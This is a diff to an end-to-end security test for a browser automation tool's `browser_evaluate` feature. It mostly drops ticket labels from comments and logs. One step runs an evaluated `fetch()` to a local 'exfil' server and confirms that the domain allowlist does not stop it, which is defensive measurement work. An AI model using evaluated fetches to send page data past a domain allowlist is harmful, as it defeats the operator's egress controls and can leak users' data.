@@ -1,10 +1,9 @@
 /**
- * B2.7 / SEC-02 / AC-SEC-11 — `browser_evaluate` on real Chromium, and the egress claim MEASURED.
+ * `browser_evaluate` on real Chromium, and the egress claim MEASURED.
  *
- * The security seed carried one belief it could not test: that an evaluated `fetch()` escapes all
- * three of the navigation allowlist's enforcement points. It follows from what a navigation is, and
- * the seed says so, but "close to certain" is not evidence — and `SPECS/SECURITY-AUTH.md` §8 now
- * carries a sentence about it, so the sentence needs a measurement behind it rather than a deduction.
+ * The security model states that an evaluated `fetch()` escapes all three of the navigation
+ * allowlist's enforcement points. It follows from what a navigation is, but "close to certain" is
+ * not evidence, so the documented sentence has a measurement behind it rather than a deduction.
  *
  * The shape of the measurement: the deployment's allowlist names **one** host (`127.0.0.1`), the
  * page is served from that host, and a second server on the *other* spelling of loopback
@@ -61,7 +60,7 @@ interface Evaluated {
 }
 
 Deno.test({
-	name: 'e2e evaluate (SEC-02, AC-SEC-11): the scope gate holds, and the allowlist does NOT bound an evaluated fetch',
+	name: 'e2e evaluate: the scope gate holds, and the allowlist does NOT bound an evaluated fetch',
 	ignore,
 	async fn(t) {
 		const exfil = exfilServer();
@@ -76,15 +75,15 @@ Deno.test({
 					!listed.includes('browser_evaluate'),
 					`browser_evaluate must not be advertised without the grant: ${listed.join(', ')}`,
 				);
-				console.log(`[B2.7] tools/list without evaluate: ${listed.length} tools, browser_evaluate absent`);
+				console.log(`[evaluate] tools/list without evaluate: ${listed.length} tools, browser_evaluate absent`);
 
 				const refused = await h.call('browser_evaluate', { expression: '1' });
 				assertEquals(refused.isError, true);
 				const text = (refused.content as Array<{ text?: string }>)[0]?.text ?? '';
 				assertStringIncludes(text, 'Error: scope-required: ');
-				// SEC-17: the refusal never names the scope a caller would have to obtain.
+				// The refusal never names the scope a caller would have to obtain.
 				assert(!text.includes('evaluate scope'), text);
-				console.log(`[B2.7] tools/call without the grant: ${text}`);
+				console.log(`[evaluate] tools/call without the grant: ${text}`);
 			});
 
 			await t.step('with the grant it evaluates in the frame’s own MAIN world', async () => {
@@ -94,7 +93,7 @@ Deno.test({
 
 				await h.callText('browser_navigate', { url: h.site.page('form') });
 				// A page global, set by the page's own script, is invisible to an isolated world and is
-				// exactly the use case D-A4 declined the isolated world for. Reading it back is the proof
+				// exactly why evaluation runs in the main world rather than an isolated one. Reading it back is the proof
 				// that the main world is what runs.
 				const seeded = await h.call('browser_evaluate', {
 					expression: 'globalThis.__ttk_probe = { seen: document.title.length > 0 }; "seeded"',
@@ -104,12 +103,12 @@ Deno.test({
 					expression: 'JSON.stringify(globalThis.__ttk_probe)',
 				})).structuredContent as Evaluated;
 				assertEquals(read.ok, true);
-				console.log(`[B2.7] main-world page global read back: ${JSON.stringify(read.value)}`);
+				console.log(`[evaluate] main-world page global read back: ${JSON.stringify(read.value)}`);
 				assertEquals(read.value, '{"seen":true}');
 			});
 
 			await t.step(
-				'SEC-02: the allowlist refuses navigation to the host and does NOT refuse a fetch to it',
+				'the allowlist refuses navigation to the host and does NOT refuse a fetch to it',
 				async () => {
 					await using h = await harness({
 						scopes: ['mcp:invoke', 'evaluate'],
@@ -124,7 +123,7 @@ Deno.test({
 					assertEquals(blocked.isError, true);
 					const blockedText = (blocked.content as Array<{ text?: string }>)[0]?.text ?? '';
 					assertStringIncludes(blockedText, 'navigation-blocked');
-					console.log(`[B2.7/SEC-02] browser_navigate to the off-allowlist host: ${blockedText}`);
+					console.log(`[evaluate egress] browser_navigate to the off-allowlist host: ${blockedText}`);
 					assertEquals(
 						exfil.hits.filter((path) => path.startsWith('/via-navigate')).length,
 						0,
@@ -132,14 +131,14 @@ Deno.test({
 					);
 
 					// Half two: the same host, reached from inside an evaluated expression. No refusal, and
-					// the request arrives. This is the measurement behind SECURITY-AUTH §8's sentence.
+					// the request arrives. This is the measurement behind the security model's sentence.
 					const marker = `/via-evaluate?c=${crypto.randomUUID().slice(0, 8)}`;
 					const evaluated = await h.call('browser_evaluate', {
 						expression: `fetch(${jsLiteral(exfil.origin + marker)}).then(r => r.status)`,
 					});
 					assertEquals(evaluated.isError, undefined, `the evaluated fetch was refused: ${JSON.stringify(evaluated)}`);
 					const payload = evaluated.structuredContent as Evaluated;
-					console.log(`[B2.7/SEC-02] browser_evaluate fetch result: ${JSON.stringify(payload)}`);
+					console.log(`[evaluate egress] browser_evaluate fetch result: ${JSON.stringify(payload)}`);
 
 					// The request may arrive after the handler returned — a fire-and-forget `fetch` is the
 					// cheaper exfiltration shape and the one the seed named — so wait for the hit rather
@@ -148,7 +147,7 @@ Deno.test({
 					while (Date.now() < deadline && !exfil.hits.some((path) => path.startsWith('/via-evaluate'))) {
 						await new Promise((resolve) => setTimeout(resolve, 50));
 					}
-					console.log(`[B2.7/SEC-02] off-allowlist host received: ${JSON.stringify(exfil.hits)}`);
+					console.log(`[evaluate egress] off-allowlist host received: ${JSON.stringify(exfil.hits)}`);
 					assert(
 						exfil.hits.some((path) => path === marker),
 						`MEASURED: an evaluated fetch must reach a host TTK_ALLOWED_DOMAINS excludes — hits ${
@@ -156,7 +155,7 @@ Deno.test({
 						}`,
 					);
 					console.log(
-						'[B2.7/SEC-02] MEASURED: TTK_ALLOWED_DOMAINS refused the navigation and did NOT constrain the ' +
+						'[evaluate egress] MEASURED: TTK_ALLOWED_DOMAINS refused the navigation and did NOT constrain the ' +
 							'evaluated fetch. The domain allowlist is not an egress control for the evaluate scope.',
 					);
 				},
@@ -172,7 +171,7 @@ Deno.test({
 				});
 				const elapsed = Date.now() - started;
 				const wedgedText = (wedged.content as Array<{ text?: string }>)[0]?.text ?? '';
-				console.log(`[B2.7] a 30 s busy loop answered in ${elapsed} ms: ${wedgedText.slice(0, 120)}`);
+				console.log(`[evaluate] a 30 s busy loop answered in ${elapsed} ms: ${wedgedText.slice(0, 120)}`);
 				assertEquals(wedged.isError, true, `a wedged expression must not succeed: ${wedgedText}`);
 				assertStringIncludes(wedgedText, 'timeout');
 				assert(elapsed < 10_000, `the 1 s cap did not bound a 30 s loop: ${elapsed} ms`);
@@ -181,7 +180,7 @@ Deno.test({
 					expression: '"x".repeat(500000)',
 				})).structuredContent as Evaluated;
 				console.log(
-					`[B2.7] a 500 000-character result: truncated=${big.truncated} length=${
+					`[evaluate] a 500 000-character result: truncated=${big.truncated} length=${
 						typeof big.value === 'string' ? big.value.length : 'n/a'
 					}`,
 				);
@@ -194,7 +193,9 @@ Deno.test({
 				const thrown = threw.structuredContent as Evaluated;
 				assertEquals(thrown.ok, false);
 				assert((thrown.error_text ?? '').length > 0);
-				console.log(`[B2.7] a page exception: ok=${thrown.ok} error_text=${(thrown.error_text ?? '').slice(0, 80)}`);
+				console.log(
+					`[evaluate] a page exception: ok=${thrown.ok} error_text=${(thrown.error_text ?? '').slice(0, 80)}`,
+				);
 			});
 
 			await t.step('every call writes one audit entry, and the expression body is not in it', async () => {
@@ -210,7 +211,7 @@ Deno.test({
 				const record = h.gateway.registry.peek('default');
 				assert(record !== undefined);
 				const ledger = record.audit.read({ principal: 'e2e', all: true });
-				console.log(`[B2.7] audit ledger after one call: ${JSON.stringify(ledger)}`);
+				console.log(`[evaluate] audit ledger after one call: ${JSON.stringify(ledger)}`);
 				assertEquals(ledger.entries.length, 1);
 				const entry = ledger.entries[0];
 				assert(entry !== undefined);
@@ -227,11 +228,11 @@ Deno.test({
 			});
 
 			await t.step(
-				'C-14 / E-75: an evaluation in a same-process CHILD frame reaches the child, and the ledger says so',
+				'an evaluation in a same-process CHILD frame reaches the child, and the ledger says so',
 				async () => {
 					// Same host, **different port**: the port is not part of a *site*, so Chromium keeps the
 					// frame in the host's renderer — and it IS part of an *origin*, so the audit's `origin`
-					// can distinguish the child from the top document at all. That is SEC-FH-1's
+					// can distinguish the child from the top document at all. That is the frame-origin
 					// counter-example shape, and it is the only shape in which this row can fail: for a
 					// same-origin child the assertion would be true whichever document the code read.
 					const sameSite = startFixtureSite({ hostname: '127.0.0.1' });
@@ -248,20 +249,20 @@ Deno.test({
 						const child = frames.frames.find((frame) => frame.url.endsWith('/frame'));
 						assert(top !== undefined && child !== undefined, JSON.stringify(frames.frames));
 						console.log(
-							`[B2.7/C-14] top=${top.url} child=${child.url} is_oopif=${child.is_oopif}`,
+							`[evaluate child frame] top=${top.url} child=${child.url} is_oopif=${child.is_oopif}`,
 						);
 						assertEquals(child.is_oopif, false, 'a different PORT on the same host is the same site: one renderer');
 						assert(new URL(child.url).origin !== new URL(top.url).origin, 'the child must be cross-ORIGIN');
 
 						// The host document has no `#frame-marker`, so an expression that finds one has
-						// provably run in the child. Before E-75's repair this same call ran in the host.
+						// provably run in the child, not in the host.
 						const inChild = await h.call('browser_evaluate', {
 							frame_id: child.id,
 							expression: 'document.getElementById("frame-marker").textContent',
 						});
 						assertEquals(inChild.isError, undefined, textOf(inChild));
 						const value = inChild.structuredContent as { ok: boolean; value?: unknown; frame_id: string };
-						console.log(`[B2.7/C-14] browser_evaluate {frame_id} -> ${JSON.stringify(value.value)}`);
+						console.log(`[evaluate child frame] browser_evaluate {frame_id} -> ${JSON.stringify(value.value)}`);
 						assertEquals(value.ok, true);
 						assertEquals(value.value, `frame ${sameSite.nonce}`);
 						assertEquals(value.frame_id, child.id);
@@ -272,7 +273,7 @@ Deno.test({
 							expression: 'document.getElementById("frame-marker").textContent',
 						});
 						const hostValue = inHost.structuredContent as { ok: boolean; error_text?: string };
-						console.log(`[B2.7/C-14] the same expression with no frame_id: ok=${hostValue.ok}`);
+						console.log(`[evaluate child frame] the same expression with no frame_id: ok=${hostValue.ok}`);
 						assertEquals(hostValue.ok, false, 'the host document must not answer for the child');
 
 						const record = h.gateway.registry.peek('default');
@@ -280,12 +281,12 @@ Deno.test({
 						const ledger = record.audit.read({ principal: 'e2e', all: true });
 						const row = ledger.entries.find((entry) => entry.frame_id === child.id);
 						assert(row !== undefined, JSON.stringify(ledger));
-						console.log(`[B2.7/C-14] the ledger row for the child frame: ${JSON.stringify(row)}`);
-						// C-14: the ledger's origin is the CHILD's, not the top document's. Reading a frame
+						console.log(`[evaluate child frame] the ledger row for the child frame: ${JSON.stringify(row)}`);
+						// The ledger's origin is the CHILD's, not the top document's. Reading a frame
 						// and recording someone else's origin against it is a false audit trail, which is
 						// worse than none.
 						assertEquals(row.origin, new URL(sameSite.url).origin);
-						assert(row.origin !== new URL(h.site.url).origin, 'the ledger recorded the TOP origin (E-75)');
+						assert(row.origin !== new URL(h.site.url).origin, 'the ledger recorded the TOP origin');
 					} finally {
 						await sameSite.close();
 					}
